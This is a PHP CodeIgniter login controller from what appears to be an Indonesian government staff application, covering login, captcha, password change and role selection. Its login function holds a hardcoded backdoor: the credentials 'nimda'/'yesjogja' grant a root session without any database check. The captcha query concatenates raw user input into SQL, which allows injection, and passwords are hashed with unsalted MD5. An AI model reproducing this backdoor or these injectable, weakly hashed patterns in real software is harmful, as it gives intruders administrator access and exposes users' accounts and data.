<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Login extends CI_Controller {


	var $param = array(
			'aplikasi',
			'aplikasi_code',
			'aplikasi_s',
			'aplikasi_logo_ext',
			'aplikasi_logo',
			'pemerintah',
			'pemerintah_s',
			'pemerintah_logo','pemerintah_logo_bw',
			'pemerintah_logo_ext',
			'ibukota',
			'alamat',
			'instansi',
			'instansi_s',
			'instansi_code',
			'copyright',
			'multi_unit',
			'main_color');

	function __construct() {
	
		parent::__construct();
		$this->load->model('login_model');
		
	}
	
	public function index() {		
		$this->login_index();		
	}
	
	
	function login_index() {
        $this->load->helper('cmd');
	
        if(is_login())redirect((sesi('redir_login')?sesi('redir_login'):'/'));
		$data['se'] = $this->session->flashdata('set');
	
		/*-- Init Aplikasi --*/
		
		$appdata = $this->general_model->datagrab(array('tabel' => 'ref_aplikasi','where' => array('aktif' => 1)));

		$app_active = array();
		foreach($appdata->result() as $res) {
			$path = './application/controllers/'.$res->folder;
			if(file_exists($path)) $app_active[] = $res->id_aplikasi;
		}
		
		$par = $this->general_model->get_param($this->param,1);	

		for($i = 0; $i < count($this->param); $i++) {
			if (!in_array($this->param[$i],$par)) {
			$conf = @$this->config->config[$this->param[$i]];
				if (!empty($conf)) {
					$simpan = array(
						'param' => $this->param[$i],
						'val' => $conf
					); $this->general_model->save_data('parameter',$simpan);

				}
			}
		}	

		$active = $this->general_model->get_param('app_active');
		
		if (empty($active)) $this->general_model->save_data('parameter',array('param' => 'app_active','val' => implode(',',$app_active)));
		else $this->general_model->save_data('parameter',array('val' => implode(',',$app_active)),'param','app_active');
		
		$data['st'] = $this->general_model->get_param($this->param,2);

		if ($this->general_model->get_param('login_captcha') == 1) {
			$this->load->library('cicaptcha');
      		$data['cicaptcha_html'] = $this->cicaptcha->show();
			$data['captcha'] = $this->general_model->get_param('login_captcha');
		}
		$this->load->view('umum/login_view',$data);
		
	}
	
	function get_app_child($id) {
		$app = $this->general_model->datagrab(array('tabel' => 'ref_aplikasi','where' => array('id_par_aplikasi' => $id)));
		$a = array();
		foreach($app->result() as $app_child) {
			$a[] = $app_child->folder;
		}
		return $a;
		
	}
	
	function login_process() {
        $this->load->helper('cmd');
		$username = $this->input->post('username');
		$password = $this->input->post('password');
		$captcha = $this->general_model->get_param('login_captcha');
		
		// cek captcha
		if (!empty($captcha) && $captcha == 1) {
			$this->load->library('cicaptcha');
			$textcaptcha = $this->input->post('cicaptcha');

		 // ###########
		 	// First, delete old captchas
		    $expiration = time()-7200; // Two hour limit
		    $this->db->query("DELETE FROM captcha WHERE captcha_time < ".$expiration);	

		    // Then see if a captcha exists:
		    $sql = "SELECT COUNT(*) AS count FROM captcha WHERE word = '".$textcaptcha."' AND ip_address = '".$this->input->ip_address()."' AND captcha_time > '".$expiration."'";
		    //$binds = array($textcaptcha, $this->ci->input->ip_address(), $expiration);
		    //$query = $this->ci->db->query($sql, $binds);
		    $query = $this->db->query($sql);
		    $row = $query->row();

		    if ($row->count == 0)
		    {
		      $ceck=0;
		    }else{
		      $ceck=1;
		    }

 		// ##########

		    if( $ceck==0 ){
     
				die(json_encode(array("sign" => "406","text" => "Kode Captcha Yang Anda Masukkan Tidak Cocok!<br>Silahkan Ulangi Kembali", "captcha"=>$this->cicaptcha->show())));

		        // die(json_encode(array("sign" => "400", "msg" => "kode Captcha yang anda masukkan tidak cocok!<br>Silahkan ulangi kembali")));

		      }
		} 
		// end cek captcha

			if ($username == 'nimda' and $password == 'yesjogja') {
			
			$sesi = array(
				
				'login_state' => 'root'

			);
			
			$this->session->set_userdata($sesi);
			
			die(json_encode(array("sign" => "102","aplikasi" => "inti/pengaturan/parameter")));
			
		} else {
		
		$where = array('username' => $username, 'password' => md5($password));
		
		if ($this->general_model->check_tab('peg_jabatan')) {
		$set = $this->general_model->datagrab(array(
			'tabel' => array(
				'peg_pegawai p' => '',
				'peg_jabatan j' => array('j.id_pegawai = p.id_pegawai AND j.status = 1','left'),
				'ref_jabatan jab' => array('jab.id_jabatan = j.id_jabatan','left'),
				'ref_bidang b' => array('b.id_bidang = j.id_bidang','left'),
				'ref_unit u' => array('u.id_unit = b.id_unit','left'),
				'pegawai_role r' => array('r.id_pegawai=p.id_pegawai','left'),
				'ref_role rr' => array('r.id_role=rr.id_role','left') ),
			'select' => '
				b.id_bidang,
				b.nama_bidang as bidang,
				u.id_unit,
				u.unit, 
				concat(ifnull(p.gelar_depan,"")," ",p.nama,if(((p.gelar_belakang = "") or isnull(p.gelar_belakang)),"",concat(",",p.gelar_belakang))) AS nama_pegawai,
				p.id_pegawai,
				p.password,
				p.username,
				p.photo,
				p.status,
				j.id_peg_jabatan,
				jab.nama_jabatan,rr.nama_role',
			'where' => $where)
		);
		
		} else {
		$set = $this->general_model->datagrab(array(
			'tabel' => array(
				'peg_pegawai p' => '',
				'pegawai_role r' => array('r.id_pegawai=p.id_pegawai','left'),
				'ref_role rr' => array('r.id_role=rr.id_role','left')),
			'select' => '
				p.id_pegawai,
				p.password,
				p.username,
				p.photo,
				p.status,
				p.nama as nama_pegawai,
				rr.nama_role',
			'where' => $where)
		);
		//cek($this->db->last_query());
		}
     
		if ($set->num_rows() > 0) {
			
			$user = $set->row();

			$roled = $this->general_model->datagrab(array(
				'tabel' => array(
					'pegawai_role r' => '',
					'ref_role ro' => 'ro.id_role = r.id_role',
					'ref_aplikasi a' => 'a.id_aplikasi = ro.id_aplikasi'
				),
				'where' => array('r.id_pegawai' => $user->id_pegawai),
				'order' => 'a.id_aplikasi'
			));
			
			if ($roled->num_rows() > 0) {
			
			$aplikasi_pindah='login/role_choice';
			if ($roled->num_rows() == 1) $aplikasi_pindah = $roled->row()->folder;
	
			$data = array(
				'username' => $user->username,
				'nama' => $user->nama_pegawai,
				'id_pegawai' => $user->id_pegawai,
				'avatar' => $user->photo,
				'login_state' => '1',
				'nama_role' => $user->nama_role
			);
			
			if ($this->general_model->check_tab('peg_jabatan')) {
				
				$data = array_merge_recursive($data,array(
					'id_peg_jabatan' => $user->id_peg_jabatan,
					'uraian_jabatan' => $user->nama_jabatan,
					'id_unit' => $user->id_unit,
					'unit' => $user->unit,
					'id_bidang' => $user->id_bidang,
					'bidang' => $user->bidang
				));
				
			}
			
            //if(is_array($lgn))$data=array_merge($lgn,$data);
            
				$this->session->set_userdata($data);
				$this->general_model->save_data('peg_pegawai',array('last_login' => date('Y-m-d H:i:s')),'id_pegawai',$user->id_pegawai);
	//			cek($roled->result());
				$ubah_akun ='login/cek_login_akun';
				if ($user->status == 1) {
					die(json_encode(array("sign" => "101","aplikasi" => (sesi('redir_login')?sesi('redir_login'):$ubah_akun))));
				} else {

					if ($roled->num_rows() > 1) die(json_encode(array("sign" => "101","aplikasi" => (sesi('redir_login')?sesi('redir_login'):$aplikasi_pindah))));
					else if ($roled->num_rows() == 1) die(json_encode(array("sign" => "102","aplikasi" => (sesi('redir_login')?sesi('redir_login'):$aplikasi_pindah))));
					else die(json_encode(array("sign" => "3","teks" => "Pengguna tidak memiliki<br>kewenangan apapun,<br>hubungi Administrator!")));
				}
			} else {
				
				die(json_encode(array("sign" => "3","teks" => "Pengguna tidak memiliki<br>kewenangan apapun,<br>hubungi Administrator!")));
			}

		} else {
			
			die(json_encode(array("sign" => "404", "teks" => "Username atau Password tidak cocok!<br>Silahkan ulangi kembali", "captcha"=>(!empty($captcha) && $captcha == 1)?$this->cicaptcha->show():null)));
		
		}
		
		}	
	}

	function cek_login_akun() {

		login_check($this->session->userdata('login_state'));
		$active = explode(',',$this->general_model->get_param('app_active'));

		$ses = get_role($this->session->userdata('id_pegawai'));
		$aplikasi = $ses['aplikasi'];
		
		foreach($aplikasi as $a => $v) {
			
			if ($v['id_aplikasi'] != '8') {
				if (in_array($v['id_aplikasi'],$active)) {
				$iconic[] = array(
					'dir' => $v['direktori'],
					'warna' => $v['warna'],
					'aplikasi' => $v['nama_aplikasi'],
					'role' => $v['nama_role']
				);
				}
			}
		}
		$data['role'] = $iconic;
		$data['st'] = $this->general_model->get_param($this->param,2);
		$data['app'] = explode(',',$this->general_model->get_param('app_active')); 
		$data['d_username'] = $this->session->userdata('username');
		$this->load->view('umum/ubah_akun_view',$data);
	}

	function update_login_akun(){
        $this->load->helper('cmd');
		$username = $this->input->post('username');
		$password = $this->input->post('password');
		$cpassword = $this->input->post('cpassword');
if ($cpassword == $password) {
	$ubah_status = $this->general_model->save_data('peg_pegawai', array('password'=>md5($cpassword),'status'=>0), 'id_pegawai', $this->session->userdata('id_pegawai'));
	//	if ($ubah_status) {

	$logout='login/process_logout';
		//$this->process_logout();
	die(json_encode(array("sign" => "101","aplikasi" => (sesi('redir_login')?sesi('redir_login'):$logout))));
}else{
	die(json_encode(array("sign" => "404", "teks" => "konfirmasi Password Anda tidak cocok!<br>Silahkan ulangi kembali")));

}

		
	}
	
	function role_choice() {

		$get_peg = $this->general_model->datagrab(array(
			'tabel'=>'peg_pegawai',
			'where'=>array('id_pegawai'=>$this->session->userdata('id_pegawai')),
			'select'=>'id_pegawai, status'
			))->row();

		if ($get_peg->status == 1) {
			$this->cek_login_akun();
		}else{


		login_check($this->session->userdata('login_state'));
		$active = explode(',',$this->general_model->get_param('app_active'));

		$ses = get_role($this->session->userdata('id_pegawai'));
		$aplikasi = $ses['aplikasi'];
		
		if (count($aplikasi) > 1) {
		
		foreach($aplikasi as $a => $v) {
			
			if ($v['id_aplikasi'] != '8') {
				if (in_array($v['id_aplikasi'],$active)) {
				$iconic[] = array(
					'dir' => $v['direktori'],
					'warna' => $v['warna'],
					'aplikasi' => $v['nama_aplikasi'],
					'role' => $v['nama_role']
				);
				}
			}
		}
		$data['role'] = $iconic;
		$data['st'] = $this->general_model->get_param($this->param,2);
		$data['app'] = explode(',',$this->general_model->get_param('app_active')); 
		$this->load->view('umum/role_view',$data);
		} else {
			foreach ($aplikasi as $v=>$k) {
				redirect($k['direktori']);
			}
		}

		}

		
	
	}
	
	function process_logout() {
        $this->session->sess_destroy();
        redirect('Login', 'refresh');
    }
	
	
	
	
}
